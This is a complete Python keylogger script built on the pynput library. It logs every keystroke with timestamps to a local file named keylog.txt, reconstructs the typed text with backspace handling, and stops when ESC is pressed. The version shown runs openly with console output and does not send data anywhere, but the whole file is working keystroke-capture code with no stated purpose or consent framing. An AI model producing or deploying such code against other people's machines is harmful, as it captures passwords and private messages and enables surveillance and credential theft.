

from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "keylog.txt"
key_buffer = []

def write_log(entry):
    with open(LOG_FILE, "a") as f:
        f.write(entry + "\n")

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        # Regular character key
        char = key.char
        key_buffer.append(char)
        log_entry = f"[{timestamp}] Key Pressed: {char}"
    except AttributeError:
        # Special key (Shift, Enter, Space, etc.)
        special = str(key).replace("Key.", "").upper()
        if special == "SPACE":
            key_buffer.append(" ")
        elif special == "ENTER":
            key_buffer.append("\n")
        elif special == "BACKSPACE" and key_buffer:
            key_buffer.pop()  # simulate backspace
        log_entry = f"[{timestamp}] Special Key : [{special}]"

    print(log_entry)
    write_log(log_entry)

def on_release(key):
    # Stop listener when ESC is pressed
    if key == keyboard.Key.esc:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stop_msg = f"[{timestamp}] --- Keylogger Stopped ---"
        print("\n" + stop_msg)
        write_log(stop_msg)

        # Write full reconstructed text session
        session_text = "".join(key_buffer)
        write_log(f"\n[Reconstructed Text]:\n{session_text}\n")
        print(f"[+] Log saved to: {os.path.abspath(LOG_FILE)}")
        return False  # Stops the listener

def main():
    print("=" * 45)
    print("=" * 45)
    print("   Press ESC to stop logging.\n")

    # Log session start
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_log(f"\n{'='*45}")
    write_log(f"[{start_time}] --- Keylogger Started ---")
    write_log(f"{'='*45}")

    print("[*] Listening for keystrokes...\n")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
